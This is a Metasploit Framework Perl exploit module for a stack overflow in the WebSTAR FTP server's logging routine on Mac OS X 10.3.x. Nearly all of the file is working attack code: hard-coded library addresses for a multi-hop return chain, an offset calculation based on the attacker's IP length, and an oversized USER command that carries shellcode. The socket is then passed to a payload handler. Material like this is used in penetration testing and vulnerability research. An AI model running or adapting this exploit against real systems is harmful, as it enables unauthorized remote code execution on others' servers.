##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::webstar_ftp_user;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
{
     'Name'  => 'WebSTAR FTP Server USER Overflow',
     'Version'  => '$Revision: 1.7 $',
	 'Authors'	=> [ 'Dino Dai Zovi <ddz [at] theta44.org>',
	                 'H D Moore <hdm [at] metasploit.com>' ],
     'Arch'  => [ 'ppc' ],
     'OS'    => [ 'osx' ],
     'Priv'  => 1,
     'UserOpts'  => {
                     'RHOST' => [1, 'ADDR', 'The target address'],
                     'RPORT' => [1, 'PORT', 'The FTP server port', 21],
					 'MHOST' => [0, 'ADDR', 'The address of the attacking system'],
                    },

     'Payload' => {
                     'Space'     => 300,
                     'BadChars'  => "\x00\x20\x0a\x0d",
                     'Keys'      => ['+findsock'],
                  },

     'Description'  => Pex::Text::Freeform(qq{
This module exploits a stack overflow in the logging routine of the
WebSTAR FTP server. Reliable code execution is obtained by a series of hops
through the System library.

     }),
     'Refs'  =>  [
					['BID', 10720],
                 ],
     'Targets' => [
                     ["Mac OS X 10.3.4-10.3.6",  0x9008dce0, 0x90034d60,0x900ca6d8, 0x90023590],
                 ],
     'Keys'  => ['webstar'],
};

# crazy dino 5-hop foo
#$ret = pack('N', 0x9008dce0); # call $r28, jump r1+120
#$r28 = pack('N', 0x90034d60); # getgid()
#$ptr = pack('N', 0x900ca6d8); # r3 = r1 + 64, call $r30
#$r30 = pack('N', 0x90023590); # call $r3

sub new {
   my $class = shift;
   my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
   return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $mhost       = $self->GetVar('MHOST');

	if (! $mhost) {
	$mhost = Pex::Utils::SourceIP($target_host);
	}

	my $target = $self->Targets->[$target_idx];

	my ($res, $req);
	my $s = Msf::Socket::Tcp->new
	(
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
	);

	if ($s->IsError) {
	$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
	return;
	}

	# Offset is dependent on length of IP address request comes from
	# (overflow is in log file line buffer)
	my $base = 285 - length($mhost);

	$req = Pex::Text::PatternCreate($base + 136 + 56 + length($shellcode));

	# ret = 296
	# 25  = 260
	# 26  = 264
	# 27  = 268
	# 28  = 272
	# 29  = 276
	# 30  = 280
	# 31  = 284

	# r1+120 = 408

	substr($req, $base + 24, 4,  pack('N', $target->[1]));  # call $r28, jump r1+120
	substr($req, $base, 4,       pack('N', $target->[2]));  # getgid()
	substr($req, $base + 136, 4, pack('N', $target->[3]));  # (r1+120) => r3 = r1 + 64, call $r30
	substr($req, $base + 120, 4, pack('N', $target->[4]));  # call $r3
	substr($req, $base + 136 + 56, length($shellcode), $shellcode);

	$res = $s->Recv(-1, 15);
	($res) = $res =~ m/^([^\n\r]+)(\r|\n)/;

	$self->PrintLine("[*] Attacking ".$target->[0]." ($res)...");
	$s->Send("USER $req\r\nHELP\r\n");

	$res = $s->Recv(-1, 5);
	chomp($res);
	$self->PrintLine("[*] $res");

	# Call the client handler
	$self->Handler($s->Socket);
	 
	return;
}
